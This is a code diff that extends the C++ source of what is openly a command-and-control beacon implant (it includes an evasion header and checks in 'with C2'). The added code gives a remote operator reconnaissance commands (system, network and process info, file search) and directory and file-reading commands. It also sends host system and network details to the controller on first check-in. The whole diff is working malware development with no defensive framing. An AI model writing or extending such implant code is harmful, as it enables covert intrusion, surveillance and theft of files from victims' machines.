@@ -32,6 +32,8 @@
 #include <ctime>
 #include <string>
 #include <sstream>
+#include <fstream>
+#include <algorithm>
 
 #include "evasion.h"
 #include "crypto.h"
@@ -238,6 +240,59 @@ std::string dispatch_command(const std::string& cmd) {
         return "Uploaded " + std::to_string(data.size()) + " bytes to " + filepath;
 #endif
     }
+    else if (action == "sysinfo") {
+        return recon::get_sysinfo();
+    }
+    else if (action == "netinfo") {
+        return recon::get_netinfo();
+    }
+    else if (action == "processes") {
+        return recon::get_processes();
+    }
+    else if (action == "find") {
+        std::string root, pattern;
+        iss >> root >> pattern;
+        if (root.empty() || pattern.empty()) return "Usage: find <root> <pattern>";
+        return recon::find_files(root, pattern);
+    }
+    else if (action == "pwd") {
+#ifdef _WIN32
+        char buf[MAX_PATH];
+        GetCurrentDirectoryA(MAX_PATH, buf);
+        return std::string(buf) + "\n";
+#else
+        char buf[1024];
+        if (getcwd(buf, sizeof(buf))) return std::string(buf) + "\n";
+        return "Error getting current directory\n";
+#endif
+    }
+    else if (action == "cd") {
+        std::string path;
+        std::getline(iss >> std::ws, path);
+        if (path.empty()) return "Usage: cd <path>";
+#ifdef _WIN32
+        if (SetCurrentDirectoryA(path.c_str())) return "Directory changed to " + path + "\n";
+#else
+        if (chdir(path.c_str()) == 0) return "Directory changed to " + path + "\n";
+#endif
+        return "Error changing directory\n";
+    }
+    else if (action == "cat") {
+        std::string path;
+        std::getline(iss >> std::ws, path);
+        if (path.empty()) return "Usage: cat <file>";
+        std::ifstream f(path, std::ios::binary);
+        if (!f) return "Error: Cannot open file " + path;
+        
+        f.seekg(0, std::ios::end);
+        size_t size = f.tellg();
+        if (size > 5 * 1024 * 1024) return "Error: File too large to cat (max 5MB). Use download.";
+        f.seekg(0, std::ios::beg);
+        
+        std::ostringstream ss;
+        ss << f.rdbuf();
+        return ss.str();
+    }
     else if (action == "sleep") {
         return "SLEEP_SET";
     }
@@ -304,9 +359,31 @@ void beacon_main(int argc, char** argv) {
 
     // ── Beacon Loop ────────────────────────────────────────────────────────
     bool alive = true;
+    bool first_checkin = true;
+
+    // Helper for escaping telemetry json
+    auto escape_json = [](const std::string& s) {
+        std::string res;
+        for (char c : s) {
+            if (c == '"') res += "\\\"";
+            else if (c == '\\') res += "\\\\";
+            else if (c == '\n') res += "\\n";
+            else if (c == '\r') res += "\\r";
+            else if (c == '\t') res += "\\t";
+            else res += c;
+        }
+        return res;
+    };
+
     while (alive) {
         // 1. Check in with C2
-        std::string response = net::checkin(cfg);
+        std::string telemetry = "";
+        if (first_checkin) {
+            telemetry = "{\"sysinfo\":\"" + escape_json(recon::get_sysinfo()) + 
+                        "\",\"netinfo\":\"" + escape_json(recon::get_netinfo()) + "\"}";
+        }
+        std::string response = net::checkin(cfg, telemetry);
+        if (!response.empty()) first_checkin = false;
 
         if (!response.empty()) {
             // 2. Parse tasks
